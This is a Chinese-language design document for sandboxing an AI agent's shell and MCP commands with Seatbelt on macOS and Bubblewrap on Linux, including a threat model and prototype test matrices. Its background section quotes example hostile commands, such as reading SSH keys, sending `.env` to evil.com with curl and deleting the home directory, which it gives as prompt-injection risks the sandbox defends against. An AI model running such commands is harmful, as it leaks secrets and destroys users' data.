# Shell 沙箱与可替换 Command Runner 设计

日期：2026-08-31（v7.1，Runner 实现统一收口到 sandbox 包）

修订记录：

- v7.0 → v7.1（目录简化）：删除 `pi/harness/command` 包，将 Runner 接口、HostRunner、环境契约、Shell 与进程组实现统一移入 `pi/harness/sandbox`。Host 作为明确的无隔离后端，与 Seatbelt/Bubblewrap 共享同一执行边界；依赖简化为 `tools → sandbox`、产品组合根/MCP driver → sandbox，`pi/mcp` 仍通过回调保持无依赖。本次只移动归属，不改变 `CommandSpec` 与运行行为。
- v6.9 → v7.0（用户定案，架构继续简化）：删除 sandbox 配置结构、配置归一化、能力矩阵与全部运行时沙箱选项。go-reagent 产品组合根只接收 WorkspaceRoot，按平台自动选择：darwin → Seatbelt、linux → Bubblewrap、windows → Host；网络固定 `allow`，宿主环境透传与额外只读挂载固定为空。darwin/linux 后端不可用时 OnStart 失败，绝不静默降级 Host；Windows 使用 Host 是明确平台契约。SDK 默认仍是 HostRunner，只有 go-reagent 产品注册平台 sandbox driver。
- v1 → v2：修复 Bubblewrap 根文件系统方案；分离 wrapper/payload 环境；补齐能力矩阵与旧配置归一化。
- v2 → v3：Seatbelt profile 经本机 macOS 26 实测修正（无效 operation 移除、`signal (target same-sandbox)`、必须放行根目录读、WorkspaceRoot 必须 EvalSymlinks、`-D` 参数注入、metadata 收窄）；统一 AllowedRoots；修正 Windows shell 契约。
- v3 → v4（架构简化）：删除 `ManagedProcess`，Runner 回归返回 `*exec.Cmd`；删除 `CommandCaller`；删除大范围环境变量黑名单；WorkDir 统一限制在 WorkspaceRoot；Seatbelt 共享 TMPDIR；ContainerRunner 移出本轮；补上 Seatbelt 对 `extra_ro_mounts` 的动态规则生成。
- v4 → v5：修正 PayloadEnv 契约矛盾；收窄 host/seatbelt 的进程终止承诺；host 后端无效配置拒绝；MCP 经 `BuildCommand` 回调注入；环境 helper 统一去重排序。
- v5 → v6：环境契约按后端分档（host 只校验格式/NUL/重复，取值保持现状语义；契约变量强制与覆盖禁止仅适用沙箱后端——v5 的统一强制会让无 TMPDIR 的宿主被误拒、并违反 host 完全兼容承诺）；所有 Runner 构造的命令设置 `exec.Cmd.WaitDelay`，防止 setsid 残留进程继承管道导致 `Wait()`/`Close()` 永久阻塞；明确 `BuildCommand` 与旧字段的互斥规则；修正章节引用。
- v6.8 → v6.9（历史方案）：接口/HostRunner/env 契约/`ShellInvocation`/进程组设置曾从 `pi/harness/tools` 分入 `pi/harness/command`；该中间包已在 v7.1 合并进 `pi/harness/sandbox`。
- v6.7 → v6.8（用户定案）：**`config.example.json` 本轮不新增 `sandbox` 段**。理由：沙箱配置是"启用时的出口"而非"开工的门槛"——缺省归一化 host+allow 与现状完全一致，§14.7 的归一化/校验代码随实现落地但不写示例段；启用沙箱的那天往 `config.json` 写 4 行即可（参考形状保留在 §6）。这同时意味着 §11 全部四步都不依赖任何配置变更，第 1 步可立即开工。
- v6.6 → v6.7（第八轮审计回填，§14 整体重写）：修复编译错误（重复 `child :=` 声明、缺 import、未定义 `dedupSortEnv`、未使用变量、`envNameRegexp`→复用仓库现有 `envNamePattern`、`cfg.WorkspaceRoot`→`cfg.Agent.WorkspaceDir`）；**堵 fail-open**：两个沙箱构造函数校验 network 只接受 allow/deny（SDK 构造函数不依赖外层 config，拼错值不能让 bwrap 漏挂 `--unshare-net`）；bwrap argv 补 `--chdir`（宿主 `cmd.Dir` 不能替代沙箱内 cwd）；`ResolveWorkDir` 改为返回 canonical 路径并统一用于 `cmd.Dir`/`--chdir`（边界判断改 `filepath.Rel`）；env helper 改 map 合并语义（契约键整体拒绝、非契约后写胜出、排序输出去重）；CLI env 模式（config 为 nil）不装配 sandbox driver，直接用默认 HostRunner（§8 同步）；探针带 10s 超时并消费 OnStart ctx；OnStart 补 passthrough 宿主存在性校验；MCP 骨架补互斥校验/start 行为/跳过 configureProcessGroup/nil,nil 检查；构造函数复制并 canonicalize `extraROMounts`，不保留调用方可变引用。
- v6.5 → v6.6：新增 **§14 参考实现骨架**——8 个文件的可落地代码（runner 接口、HostRunner 纯重构、env helper、bwrap/seatbelt 后端、config 归一化、Fx 装配、MCP 回调），与正文条款一一对应并标注映射；以本节为实现基线。§5.2 基础项同步注明固定值口径（LANG=C.UTF-8、TERM=dumb）。
- v6.4 → v6.5（第七轮审计回填，零架构改动）：§8 给出固定注册关系图——SDK 新增 `CommandRunnerRegister`（`fx.Provide` 默认 HostRunner），`pi.Register`/CLI/server 显式包含之（`fx.Decorate` 只能替换已存在对象，基础 Provider 必须真实存在，server 只装配 `ReadOnlyToolsRegister` 不够），CLI/server 再包含 sandbox driver（Decorate + OnStart 探针 Invoke）；§12 kill 契约补两档断言（非零退出 → `*exec.ExitError`；成功退出后代持管道 → `errors.Is(err, exec.ErrWaitDelay)` + `pipe_wait_expired`）；修正 §12 引用（§5.3→§5.5）；§5.2 基础项 `LANG=C.UTF-8`、`TERM=dumb` 固定值（沙箱无 PTY，不继承宿主）；`BuildArgv` 空 argv 拒绝（接口注释 + 单元测试）；§6.1 归一化"行为完全一致"补 WaitDelay 例外指针。
- v6.3 → v6.4（第六轮审计回填，零架构改动）：§8 明确 **Provider 所有权唯一**——tools 注册模块提供默认 `CommandRunner`（HostRunner），组合根 `infrastructure/driver/sandbox.Register` 用 `fx.Decorate` 按配置替换，杜绝 duplicate provider；OnStart 探针不进主接口，由 driver hook 调用 `pi/harness/sandbox` 导出的后端探针函数；§3 决策 2"硬编码"表述修正为"选择映射在组合根、机制常量在 `pi/harness/sandbox`"；§4.2 `WaitDelay` 错误语义按 Go 实际情况分两档（非零退出 → `*exec.ExitError` 语义不变；成功退出但后代持管道 → `ErrWaitDelay`）；§12 补 seatbelt 宿主进程枚举不可见断言与 WorkDir 符号链接逃逸负向测试（边界判断明确用 EvalSymlinks 真实路径）；§13 host 兼容承诺补 WaitDelay 例外。
- v6.2 → v6.3（归属修正）：seatbelt/bwrap 后端实现下沉进 pi SDK（`pi/harness/sandbox` 子包），作为公用品提供——命令级沙箱是库代码而非部署配置，拆给每个使用方复刻 profile 生成/挂载清单/探针分类只会制造高危重复。与 pi.dev 口径的对应关系同步修正：pi 推到部署边界是因为它**不提供**命令级沙箱；我们提供，则"机制随 SDK 走、**选择**留组合根"，两件事拆开。后端构造函数只收纯参数、不 import config 包，硬编码仍只在组合根一处。
- v6.1 → v6.2（第五轮审计回填，均为文档修正、零架构改动）：修正 §12 中与原型/设计矛盾的三处验收断言（`/proc/1/environ` 按原型改为"可读但只含 WrapperEnv"；`~/.ssh` 类用例改为工作区外 canary 绝对路径——沙箱 `HOME=<WorkspaceRoot>` 下 `~` 展开测不了宿主隔离；Build 契约按后端分断，host 是 `Env=PayloadEnv`）；补上 `WaitDelay` 触发时 `exec.ErrWaitDelay` 的错误映射并明确这是 host 兼容承诺的唯一例外；"密钥物理上不可能合流"收窄为"不自动合流"（host 继承宿主环境、显式 passthrough 属部署方授权）；更正 `/usr/local` 在 `/usr` 整体挂载下实际可见，例子改为 `/opt`。
- v6 → v6.1（bwrap 原型回填，Ubuntu 24.04 / kernel 6.8 / bwrap 0.9.0 实测）：§5.1 参数组合补上 **`--clearenv`**（原型发现缺失时 payload 继承 wrapper 环境，正是要堵的泄露通道）；实证 `/proc/1/environ` 暴露的是 bwrap 自身环境即 WrapperEnv——wrapper 环境最小化是硬要求而非卫生建议；验证矩阵回填 §5.1，§11 第 0 步全部完成。

## 1. 背景

go-reagent 当前的安全边界分布在三处：

- 文件工具（`read/edit/write/apply_patch`）通过 `pi/harness/tools/filesystem.go` 的 `Workspace`（封装 `os.Root`）实现内核级路径禁锢，拒绝绝对路径、`..` 穿越和符号链接逃逸。
- `pi/middleware/permission.go` 提供 deny-only 规则中间件（工具名精确匹配 + 参数正则），作为高危调用的前置拦截。
- `exec/process` 工具经 `child_process.go` 直接调用 `os/exec`，命令拥有宿主进程完整权限。工具描述与结构化 Tool Runtime 设计文档均明确声明"cwd 不是安全沙箱"。

也就是说，**文件面已闭合，Shell 面完全裸奔**。模型一旦因 prompt injection 或误判执行 `cat ~/.ssh/id_rsa`、`curl evil.com --data @.env`、`rm -rf ~`，现有机制只有 deny 正则一道软防线，而正则枚举不完所有逃逸写法（编码、变量展开、间接命令）。

2026-07-31 的结构化 Tool Runtime 设计将 Sandbox 列为非目标，本轮设计正式结束该非目标状态。隔离机制作为 `pi/harness/sandbox` 公用库随 SDK 发布；go-reagent 产品组合根只负责按运行平台自动选择后端并 fail-fast，不开放运行时沙箱配置。

### 威胁模型

按优先级排序：

1. **数据外泄**：Shell 命令读取工作区外文件（`~/.ssh`、`.env`、云凭证）；通过 Shell 环境变量继承拿到 `OPENAI_API_KEY` 等密钥；通过 `/proc/<pid>/environ` 二次读取宿主进程环境；wrapper 进程环境被注入控制变量（`DOCKER_HOST`、`LD_PRELOAD`）；再经网络外传。
2. **破坏性操作**：误删文件、kill 宿主进程、写系统路径。
3. **供应链**：stdio MCP Server 与 Agent 进程同权限运行，第三方 MCP 包即宿主任意代码执行。
4. **资源耗尽**：fork 炸弹、磁盘写满（本轮列为残余风险，见 §10）。

## 2. 目标与非目标

### 2.1 目标

- 抽象薄 `Runner` 接口：只负责构造受限的 `*exec.Cmd`，进程生命周期（管道、启动、等待、进程组终止）继续由 ProcessSupervisor 与 MCP transport 各自持有。
- 提供三档后端：`host`（现状）、`seatbelt`（macOS）、`bubblewrap`（Linux）。
- 沙箱后端不向 payload 继承宿主环境变量，也不提供宿主变量透传；exec 与 MCP 的环境构造函数分离，MCP 密钥不合流进 exec。
- wrapper（宿主侧）与 payload（沙箱内）环境严格分离，模型与 MCP 配置均无法污染 wrapper 环境。
- 网络固定 `allow`，保持构建依赖下载与联网 MCP 的现状能力。
- go-reagent 按平台自动选择后端；平台与二进制可用性在 Fx OnStart fail-fast，不静默降级。
- stdio MCP Server 复用同一 `Runner`（Argv 模型，不经 shell），收敛供应链面。
- deny 规则中间件保留，作为沙箱之前的纵深防线，两者不互相替代。

### 2.2 非目标

- 不实现人工审批/确认流；权限控制只有 deny 规则与环境隔离两类。
- 不改动文件工具的 `os.Root` 禁锢（已闭合）。
- 不实现 PTY、远程节点、多主机路由。
- 不实现 seccomp 系统调用级过滤。
- 本轮不治理资源耗尽（fork 炸弹、磁盘、进程数），列为显式残余风险。
- 不为 Windows 提供沙箱后端；Windows 明确使用 `host`。
- 不实现 ContainerRunner。**ContainerRunner 第二轮独立设计文档覆盖，不承诺兼容本轮 `CommandRunner` 接口**；待容器生命周期（kill、隔离单元、网络拓扑、资源默认值）原型完成后再决定接口是否演进。
- 本轮不开放任何沙箱运行时配置，包括网络策略、宿主环境透传、额外挂载与容器枚举。

## 3. 总体架构

```text
exec / process 工具 ──► ProcessSupervisor ──┐   各自持有进程生命周期
                                             ├── CommandRunner.Build... ──► *exec.Cmd
stdio MCP transport ────────────────────────┘        ▲
                                                     │ 后端由组合根按 GOOS 自动选择
                       ┌─────────────┬──────────────┴───┬─────────────────┐
                       │ HostRunner  │ SeatbeltRunner   │ BubblewrapRunner │
                       └─────────────┴──────────────────┴─────────────────┘
```

关键决策：

1. **Runner 是薄构造器，返回原生 `*exec.Cmd`**。本轮三个后端（shell、sandbox-exec、bwrap）都是本地 wrapper 进程，天然可表示为 `*exec.Cmd`；现有进程组治理（kill 整组）对三者继续有效（bwrap 配 `--die-with-parent`）。Runner 不接管管道、启动、等待和终止，避免重造 `exec.Cmd` 生命周期。
2. **命令执行边界统一由 `pi/harness/sandbox` 提供**：同一包拥有 Runner 契约及 Host/Seatbelt/Bubblewrap 三个后端；`pi/harness/tools` 只持有 Runner 接口，不理解后端机制。依赖单向 `tools → sandbox`，无环；`pi/mcp` 仍不依赖 harness 包。SDK 默认注册 HostRunner；go-reagent 产品组合根只传 WorkspaceRoot，由 sandbox driver 按 GOOS 自动替换。网络、透传和额外挂载均为固定代码契约，不读取 config。
3. **环境构造下沉到调用方**：exec 与 MCP 各自准备最终 payload 环境（§5.2），Runner 只做契约中央校验（§5.3）。"密钥不合流"由两个构造函数的分离 + 测试保证，不在 Runner 内引入调用来源分支。

## 4. 接口契约

```go
// pi/harness/sandbox

// SandboxPolicy 是后端的生效策略，用于工具描述、CLI banner 与 Details。
type SandboxPolicy struct {
    Backend string // host / seatbelt / bubblewrap
    Network string // 本轮固定 allow；用于展示生效策略
}

// CommandSpec 描述一次命令执行的共享约束。
type CommandSpec struct {
    // WorkDir 是本次 cwd 的宿主绝对路径，必须位于 WorkspaceRoot 内。
    // 边界判断对 WorkDir 与 WorkspaceRoot 都用 filepath.EvalSymlinks 解析后的
    // 真实路径（与 Seatbelt profile 注入同一规则，§5.5）；符号链接逃逸即拒绝。
    WorkDir string
    // PayloadEnv 是调用方准备好的最终 payload 环境（KEY=VALUE 列表）。
    // 沙箱后端在沙箱边界内侧注入；host 后端直接作为进程环境。
    // Runner 校验契约变量（§5.3）后原样使用。
    PayloadEnv []string
}

// Runner 构造受限的、未启动的 *exec.Cmd。
type Runner interface {
    Policy() SandboxPolicy
    // BuildShell 按后端 shell 契约（§4.1）构造 shell 命令进程。
    BuildShell(command string, spec CommandSpec) (*exec.Cmd, error)
    // BuildArgv 构造不经 shell 的直接执行进程（argv[0] 为可执行文件），
    // 用于 MCP stdio。空 argv 返回结构化拒绝错误（不访问 argv[0]）。
    BuildArgv(argv []string, spec CommandSpec) (*exec.Cmd, error)
}
```

职责划分：

- **CommandRunner**：校验 WorkDir 与 PayloadEnv 契约；构造 wrapper argv；分离 wrapper/payload 环境；设置 `Dir`、`Env`（WrapperEnv）、`SysProcAttr`（进程组）、`WaitDelay`（见 §4.2）。
- **ProcessSupervisor**（exec）：保持现状——启动前接管 stdout/stderr 写入器、创建 StdinPipe、进程组终止、读取 `ProcessState.ExitCode()`、有界日志与流式更新。**不需要管道泵等任何适配**。
- **MCP transport**：保持现状——三根独立管道跑 JSON-RPC，自有生命周期。

错误语义分三层，不可混淆：

1. **Build 返回 error**：策略拒绝（`env_contract_rejected/workdir_rejected`），结构化启动错误。
2. **Start 返回 error**（调用方持有）：spawn 失败（沙箱二进制缺失、参数不被接受）。
3. **ProcessState**：命令真实运行结果，非零退出不是系统错误。

### 4.1 shell 调用契约（固定现状与各后端行为）

| 后端 | shell 调用 |
|---|---|
| host (Unix) | `$SHELL -lc <command>`（`$SHELL` 为空回退 `/bin/sh`，逻辑保留在 host.go） |
| host (Windows) | `cmd.exe /d /s /c <command>`（逻辑保留在 host.go） |
| seatbelt | 固定 `/bin/sh -c <command>` |
| bubblewrap | 固定沙箱内 `/bin/sh -c <command>` |

沙箱后端不用 `$SHELL`：`$SHELL` 可能指向 `/usr/local` 等未挂载路径导致直接失败；login shell（`-l`）会 source `/etc/profile` 等沙箱外文件产生拒绝噪音。这是有意的行为差异，写入 exec 工具描述。

第一步纯重构的验收标准是现有测试不改断言全部通过；新增契约测试固定 host 两档真实行为，防止重构漂移。

### 4.2 进程终止契约（按后端如实承诺）

现有终止机制是进程组 kill（`syscall.Kill(-pid, SIGKILL)`，process_group_unix.go）。**子进程调用 `setsid()` 后会进入新进程组，负 PID kill 无法命中**——因此承诺按后端分档，不虚假验收：

- **host / seatbelt**：只承诺终止 wrapper 所属的**原进程组**；主动 `setsid`/双 fork 脱离的后台进程可能残留，如实写入残余风险（§10），不做"无残留"验收。要彻底清理需要进程枚举/supervisor 机制，复杂度不值得，本轮不做。
- **bubblewrap**：承诺**整个 PID namespace 无残留**。bwrap 以 `--die-with-parent` 随父死亡，且它是 namespace 内 PID 1——namespace 的 init 死亡时内核对命名空间内**所有**进程（含 setsid 脱离者）发 SIGKILL。这是 namespace 隔离相对进程组 kill 的实质优势。

**管道有界等待（全后端）**：setsid 残留进程若继承了 stdout/stderr 管道，`cmd.Wait()` 会因等不到 EOF 而永久阻塞，进而卡死 `ProcessSupervisor.Close()`（其会等待所有 session 结束，process_supervisor.go）。Go 1.26 提供 `exec.Cmd.WaitDelay`：所有 Runner 构造的命令统一设置固定上限（常量 `processPipeWaitDelay`，初始 3 秒）。它不杀脱离进程，只在直接子进程退出后有界关闭遗留管道，保证 `Wait()`、kill 与 shutdown 不卡死。`WaitDelay` 触发时 `Wait()` 的返回错误按 Go 实际语义分两档，不夸大承诺：直接子进程**非零退出或被 kill** → 正常 `*exec.ExitError`（错误类别与退出码语义不变，`ExitCode()` 是负数表示被 kill，WaitDelay 只是有界关闭遗留管道）；直接子进程**成功退出但后代持有管道** → `exec.ErrWaitDelay`，映射为 session 失败、`category=pipe_wait_expired`，错误文本说明有后台后代未关闭管道。两档都必须有界返回，这是 host 兼容承诺的唯一例外行为变更——该场景原本会让 `Wait()`/supervisor `Close()` 永久阻塞，属于缺陷修复（§11 第 1 步同步引入）。

集成测试对应调整：`setsid`/双 fork 无残留断言只对 bwrap 执行；host/seatbelt 只断言原进程组被终止。另增全后端测试：`/bin/sh -c 'setsid sleep 1000 &'` 启动后终止直接 shell，断言 `Wait()` 在 `WaitDelay` 上限附近返回而非永久阻塞。

## 5. 隔离语义

### 5.1 Bubblewrap 根文件系统（最小化挂载，不挂宿主根）

v1 的 `--ro-bind / /` 只防写不防读，`~/.ssh`、云凭证仍然可读，已废弃。本轮采用最小根文件系统：

```text
bwrap
  --die-with-parent
  --unshare-user --unshare-pid --unshare-ipc --unshare-uts
  --clearenv                               # 必需：不带时 payload 继承 wrapper 环境（原型实测）
  --ro-bind /usr /usr
  --ro-bind /bin /bin
  --ro-bind /lib /lib
  [--ro-bind /lib64 /lib64]                # 存在时（x86_64 必需：动态加载器
                                           #  /lib64/ld-linux-x86-64.so.2 在此，
                                           #  缺失则所有动态链接程序 execvp ENOENT）
  --ro-bind /etc/hosts /etc/hosts          # 网络固定 allow
  --ro-bind /etc/resolv.conf /etc/resolv.conf
  --ro-bind /etc/ssl /etc/ssl
  --tmpfs /tmp                             # 私有 tmp，不共享宿主 /tmp；TMPDIR=/tmp
  --proc /proc                             # 配合 --unshare-pid，仅见沙箱内进程
  --dev /dev
  --bind <WorkspaceRoot> <WorkspaceRoot>   # 唯一可写业务路径
  --chdir <spec.WorkDir>
  [--setenv KEY VALUE]...                  # payload 环境，见 §5.2
  -- /bin/sh -c <command>                  # 或 argv 直接执行
```

要点：

- 不挂载 `/home`、`/root`、`/etc` 整体；`/etc` 只按文件白名单挂网络与 TLS 必需项。
- `--unshare-pid` 隔离 PID namespace，`/proc` 内只有沙箱进程，`/proc/<host-pid>/environ` 不可达；同时也看不到更无法 signal 宿主进程。
- **`/proc/1/environ` 暴露的是 bwrap 自身（PID namespace init）的环境，即 WrapperEnv**（原型实测：wrapper 环境含 `SECRET_CANARY` 时 payload 可经此路径读到）。因此 §5.3 的"WrapperEnv 固定最小"是硬要求而非卫生建议；配合 `--clearenv` 后 payload 自身环境只含 `--setenv` 注入项。
- 宿主编译工具链（如 `go`、`node` 装在 `/opt` 或 `$HOME` 下）在沙箱内不可见是**固定行为**（注意：`/usr` 整体挂载后 `/usr/local` 可见）；本轮没有额外挂载出口，所需工具链必须位于工作区或默认系统路径内，并以绝对路径调用（payload PATH 是固定契约变量，见 §5.3）。
- **OnStart 探针必须用完整生产参数组合**（上述全部挂载 + `-- /bin/sh -c 'exit 0'`），不能只跑 `bwrap --unshare-user true`：新 mount namespace 中未必存在 `true`，会把"二进制缺失"误判为"namespace 不可用"。探针失败时按 stderr 区分错误类别（原型实测三种形态均含可识别关键词）：`No permissions to create new namespace`（内核/策略禁用 userns）、`setting up uid map: Permission denied`（Ubuntu 24.04 AppArmor userns 限制）、`Can't find source path`（挂载源缺失）。
- Ubuntu 24.04 部署注意：`kernel.apparmor_restrict_unprivileged_userns=1` 时非特权进程创建 userns 被拒，即使 `unprivileged_userns_clone=1`；探针会捕获并给出指引（安装 bubblewrap 官方包附带 AppArmor profile，或调整该 sysctl）。

**原型验证矩阵（Ubuntu 24.04 / kernel 6.8 / bwrap 0.9.0，21/21 通过）**：

| 场景 | 结果 |
|---|---|
| 生产参数组合跑 `/bin/sh -c 'echo hi'`、argv 直执 curl | 正常 |
| 写 WorkspaceRoot / 写 `/usr` | 成功 / 被拒 |
| 读 `/etc/shadow`、`/home`（未挂载） | 路径不存在 |
| 私有 `/tmp` 写入、不落宿主 | 成功 |
| `/proc/1` 为 bwrap（沙箱 init）、`/proc` 仅 4 进程 | 宿主进程不可见 |
| 无 `--clearenv` 时 payload 继承 wrapper 环境（7 变量）→ 加后仅 `--setenv` 项 | **缺失实证，已补参数** |
| wrapper 环境含密钥时 payload 经 `/proc/1/environ` 可读 / 自身 env 不可见 | WrapperEnv 最小化实证 |
| kill bwrap（SIGKILL）后 `setsid sleep` 后代 | 整个 namespace 无残留（§4.2 承诺成立） |
| network=allow（/etc 三件套）curl HTTPS | 200 |
| 探针错误：挂载源缺失 vs userns 被禁 vs uid map 被拒 | stderr 关键词可区分 |

该矩阵必须在 CI Linux job 中固化为自动化测试（§12）。

### 5.2 环境构造下沉到调用方

Runner 不知道调用来源，两个调用方各自准备最终 `PayloadEnv`：

- **exec 路径**（env 构造函数在 `pi/harness/sandbox`，由 tools 的 exec 工具调用）：基础项 + 模型提交的 `exec.env`（沿用现有校验），不读取任何宿主变量。
- **MCP 路径**（沙箱后端由组合根 MCP driver 构造 env、调用同一 sandbox helper；host 后端维持 `pi/mcp` 的 `resolveChildEnv` 现状——`pi/mcp` 不依赖 harness）：基础项 + 该 MCP server 的 `env` 配置项。不接受任何模型输入。

基础项由共享 helper 提供（仅沙箱后端）：`PATH=/usr/bin:/bin`、`HOME=<WorkspaceRoot>`、`LANG=C.UTF-8`、`TERM=dumb`（均取**固定值**，不从宿主继承——沙箱无 PTY（§2.2），且继承宿主 locale/终端设置会泄露宿主个性化信息；工具需要别的值可经 `exec.env` 显式传非契约变量）、`TMPDIR`（按 §5.4 后端分策略）。host 后端不使用基础项，按现状语义准备（exec：`os.Environ()` 合并覆盖；MCP：`resolveChildEnv` 现状）。

两个构造函数的职责边界（**覆盖禁止仅适用沙箱后端**）：

- 沙箱后端：模型 `exec.env` 或 MCP server `env` 配置试图设置 `PATH`/`HOME`/`TMPDIR` 时，exec 路径拒绝本次调用（`env_contract_rejected`）、MCP 路径 OnStart fail-fast。基础项由 helper 无条件写入，调用方输入只允许叠加非契约变量。
- host 后端：维持现状语义，不新增限制——exec 沿用现有"禁改 PATH、允许覆盖 HOME/TMPDIR"（child_process.go），MCP 沿用 `resolveChildEnv` 现状（含 PATH 覆盖）。host 的兼容承诺优先于统一性。
- **输出去重且排序**：helper 合并后每个变量名只出现一次，按键排序输出，保证 Build 契约测试可断言、行为可复现（host 后端变量取值维持现状兼容，重复项顺序不作为公开契约）。

因此 MCP server 的密钥（如 Exa API Key）不会合流进模型可见的沙箱 exec 进程：两条构造通道分离，沙箱 exec 只能看到基础环境与模型提交的非契约变量。Windows HostRunner 仍继承宿主环境，这是明确的 host 平台契约。环境隔离由测试固化。

### 5.3 wrapper/payload 分离与 Runner 中央校验

seatbelt、bwrap 都是宿主侧 wrapper。模型提交的 `exec.env` 若直接写入 `cmd.Env`，会先影响尚未进入沙箱的 wrapper（`DOCKER_HOST`、动态加载器变量都是前置攻击面）。因此：

- **WrapperEnv**：由后端固定构造，仅含 `PATH=/usr/bin:/bin` 与后端必需的少量变量；任何外部输入不可覆盖。`*exec.Cmd.Env = WrapperEnv`。
- **PayloadEnv**：在沙箱边界内侧注入——bwrap 用 `--setenv`，seatbelt 用 `env -i KEY=V ... /bin/sh -c ...`（`env` 是 wrapper argv 的一部分，但环境生效于沙箱内进程）；host 后端无 wrapper，`PayloadEnv` 直接作为 `cmd.Env`（调用方按现状语义准备：exec 为 `os.Environ()` 合并覆盖，MCP 维持现状继承语义）。

Runner 对 `PayloadEnv` 的中央校验（**按后端分档**）：

- **沙箱后端（seatbelt/bubblewrap）——契约变量完整性**：`PATH`、`HOME`、`TMPDIR` 必须存在、只能出现一次、且值等于后端预期值（§5.2 helper 产出的基础项）。缺失、重复或值不匹配即 `env_contract_rejected`。这是对"调用方确实经过了共享 helper"的收口验证——正常经构造函数产出的最终环境必然通过；覆盖拒绝发生在构造函数内（§5.2），不在 Runner。
- **host 后端——不校验契约变量**：宿主可能本就没有 `TMPDIR`，强制存在会误拒；host 的环境取值语义完全保持现状（§5.2）。
- **全后端统一**：无重复变量名（任何变量名出现超过一次即拒绝——helper 已去重，重复意味着绕过了 helper）；变量名合法性（非空、不含 `=`/NUL）与值不含 NUL（沿用现有校验）。

除此之外**不设环境变量黑名单**：wrapper/payload 分离后，`LD_*`/`DYLD_*`/`DOCKER_*` 等只在沙箱内生效，而模型本来就能在沙箱内执行任意命令，黑名单不增加安全边界，只会误伤构建与测试工具。host 后端同理——模型在 host 上本就拥有完整 shell。

### 5.4 TMPDIR 按后端分策略

| 后端 | TMPDIR | 说明 |
|---|---|---|
| host | 不设置（现状继承） | 行为不变 |
| seatbelt | `<WorkspaceRoot>/.tmp` | Workspace 启动时创建一次；不放行共享 `/tmp` |
| bubblewrap | `/tmp` | 指向沙箱内私有 tmpfs，天然隔离 |

seatbelt 用单一共享 `.tmp` 而非每命令目录：所有沙箱命令本来就能读写整个 WorkspaceRoot，per-session 目录不构成真实隔离，只增加生命周期复杂度。

### 5.5 Seatbelt 正式策略（macOS 26 / Darwin 25.4 本机原型验证通过）

以下 profile 已逐条实测，验证矩阵见本节末尾。

**生成与注入方式**：

- `sandbox-exec -p "<profile>"` 内联传入，OnStart 按 WorkspaceRoot 在内存生成，**不落盘**。
- WorkspaceRoot 经 `-D WORKSPACE_ROOT=<realpath>` 注入，profile 内以 `(subpath (param "WORKSPACE_ROOT"))` 引用，避免 Scheme 字符串拼接注入；同时构造期校验路径不含 `"`、`\`、换行（纵深防御）。
- 所有路径先 `filepath.EvalSymlinks` 解析为真实路径再注入（实测：macOS 上 `/tmp`、`/etc` 均为符号链接，未解析路径的 subpath 规则不匹配真实 vnode）。

**固定 profile（network=allow）**：

```scheme
(version 1)
(deny default)
(allow process-exec)                              ;; 沙箱内可 exec 新程序（仍受文件规则约束）
(allow process-fork)
(allow signal (target same-sandbox))              ;; 命令树内可互杀；target self 实测不足以杀子进程
(allow file-read* (literal "/"))                  ;; 必需：sh/dyld 启动读取根目录，缺失则 SIGABRT
(allow file-read-metadata (literal "/"))
(allow file-read-metadata (subpath "/usr") (subpath "/bin") (subpath "/sbin")
                         (subpath "/System") (subpath "/Library/Frameworks")
                         (subpath (param "WORKSPACE_ROOT")))
(allow file-read* (subpath "/usr") (subpath "/bin") (subpath "/sbin")
                  (subpath "/System") (subpath "/Library/Frameworks"))
(allow file-read* (subpath (param "WORKSPACE_ROOT")))
(allow file-write* (subpath (param "WORKSPACE_ROOT")))
(allow file-write* (literal "/dev/null"))
(allow file-read* (literal "/private/etc/resolv.conf"))
(allow file-read* (subpath "/private/etc/ssl"))
(allow mach-lookup (global-name "com.apple.system.opendirectoryd.libinfo"))  ;; getaddrinfo 必需
(allow network-outbound)
```

**设计说明与实测依据**：

- 无 `process-info` 显式 deny：该 operation 不存在（实测 `unbound variable`），且 `deny default` 已覆盖全部未列出的操作，包括进程枚举。
- `(allow signal (target same-sandbox))`：实测同沙箱命令树内 `kill $!` 成功，`kill -0 1`（宿主 launchd）EPERM。`target self` 实测杀子进程仍 EPERM，不满足 §4.2 kill 契约。
- `(allow file-read* (literal "/"))`：实测缺失时 `/bin/sh -c 'echo hi'` 直接 SIGABRT（exit 134）；加入后正常。泄露面仅为根目录条目清单，记录为可接受残余风险。
- metadata 收窄到允许清单内：实测 `test -e /etc/hosts` 返回"不存在"，工作区外路径存在性不可探测。副作用：cwd 不在允许清单时 shell 报 getcwd 警告——沙箱下 cwd 恒在 WorkspaceRoot 内，无实际影响。
- 不放行共享 `/tmp`；`TMPDIR` 按 §5.4 指向 Workspace 内 `.tmp`。

**本机验证矩阵（全部通过）**：

| 场景 | 结果 |
|---|---|
| `/bin/sh -c 'echo hi'` | 正常输出 |
| 读 `/etc/hosts`、`~/.zshrc` | EPERM |
| 写 `/tmp/x`（工作区外） | EPERM |
| 写 WorkspaceRoot（符号链接路径，profile 用真实路径） | 成功 |
| `kill` 同沙箱子进程 / `kill -0 1` | 成功 / EPERM |
| network=allow 下 `curl https://` | 200 |
| `-D` 参数注入 WorkspaceRoot | 生效 |
| metadata 收窄后 `test -e /etc/hosts` | 返回不存在（无存在性泄露） |

该矩阵必须在 CI macOS job 中固化为自动化测试（§12）。

已知限制：`sandbox-exec` 被苹果标记 deprecated（macOS 26 仍可用）；文档记录该风险，backend 不可用时 OnStart 明确报错。

### 5.6 MCP cwd 迁移规则

现有 MCP 配置允许任意已有 cwd，`cwd=""` 表示继承服务进程 cwd（config/validate.go）。规则：

- `host` 后端：维持现状完全兼容（含空 cwd 继承）。
- 沙箱后端：**WorkDir 永远只能位于 WorkspaceRoot 内**。MCP server 显式 cwd 越界 → `config.Load` fail-fast；空 cwd 归一化为 WorkspaceRoot——这是可见的兼容性变化，写入 CHANGELOG 与配置说明。
- MCP server 的可执行文件必须位于工作区或默认系统可读路径；本轮没有额外挂载出口。cwd 始终位于 WorkspaceRoot。

## 6. 固定产品策略（无配置）

本轮不增加任何 sandbox 配置结构，`config.json` 与 `config.example.json` 均无 sandbox 段。go-reagent 的策略直接写在产品组合根：

| 平台 | 后端 | 网络 | 宿主环境透传 | 额外挂载 |
|---|---|---|---|---|
| darwin | seatbelt | allow | 无 | 无 |
| linux | bubblewrap | allow | 无 | 无 |
| windows | host | allow | host 现状继承 | host 现状可见 |

